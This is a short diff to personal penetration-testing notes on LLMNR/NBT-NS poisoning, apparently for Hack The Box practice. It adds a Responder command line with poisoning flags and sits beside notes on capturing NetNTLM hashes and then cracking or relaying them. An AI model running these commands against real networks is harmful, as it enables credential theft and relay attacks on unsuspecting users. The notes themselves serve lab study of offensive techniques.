@@ -14,7 +14,8 @@ This can lead to credential theft and relay attacks.
 When victim responds, it contains NETNTLM hash and username - the ntlm challenge encrypted with ntlm hash of user  
 
 **Attack**: reponder for nix and inveigh for windows, crack or relay  
-**Reponder**: 
+**Reponder**:  
+sudo responder -I ens224 -wrfv  //good to run from htb  -- covers llmnr,netbios-ns,wpad  
 Start responder and try random address on victim y \\soda or access responder ip \\10.1.1.1  
 sudo responder -I etho  //default settings  responder --help for more options  
 settings to disable service - /etc/responder/Responder.conf  
